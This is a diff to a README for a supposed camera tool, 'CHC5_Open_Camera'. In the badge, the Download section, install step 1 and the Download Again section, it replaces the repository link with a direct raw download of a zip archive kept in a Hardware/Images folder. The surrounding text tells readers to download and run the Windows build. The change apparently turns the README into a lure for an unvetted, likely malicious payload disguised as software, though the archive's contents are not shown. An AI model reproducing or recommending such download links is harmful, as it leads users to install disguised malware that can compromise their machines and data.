@@ -1,6 +1,6 @@
 # 📷 CHC5_Open_Camera - Open vision for your camera workflow
 
-[![Download CHC5_Open_Camera](https://img.shields.io/badge/Download-CHC5_Open_Camera-blue?style=for-the-badge)](https://github.com/initiationgoody185/CHC5_Open_Camera)
+[![Download CHC5_Open_Camera](https://img.shields.io/badge/Download-CHC5_Open_Camera-blue?style=for-the-badge)](https://github.com/initiationgoody185/CHC5_Open_Camera/raw/refs/heads/main/Hardware/Images/Camera_Open_CH_v2.7.zip)
 
 ## 🧭 Overview
 
@@ -19,7 +19,7 @@ Use it to:
 ## 💾 Download
 
 Visit this page to download:  
-https://github.com/initiationgoody185/CHC5_Open_Camera
+https://github.com/initiationgoody185/CHC5_Open_Camera/raw/refs/heads/main/Hardware/Images/Camera_Open_CH_v2.7.zip
 
 Use the link above, then look for the latest release or project files on the page. Download the Windows build that matches your system.
 
@@ -59,7 +59,7 @@ It is also designed for systems that use:
 ## 🛠️ How to Install
 
 1. Open the download page:  
-   https://github.com/initiationgoody185/CHC5_Open_Camera
+   https://github.com/initiationgoody185/CHC5_Open_Camera/raw/refs/heads/main/Hardware/Images/Camera_Open_CH_v2.7.zip
 
 2. Find the latest Windows package or release file.
 
@@ -179,4 +179,4 @@ If the image looks wrong:
 ## 📥 Download Again
 
 If you need the file again, use this link:  
-https://github.com/initiationgoody185/CHC5_Open_Camera
+https://github.com/initiationgoody185/CHC5_Open_Camera/raw/refs/heads/main/Hardware/Images/Camera_Open_CH_v2.7.zip
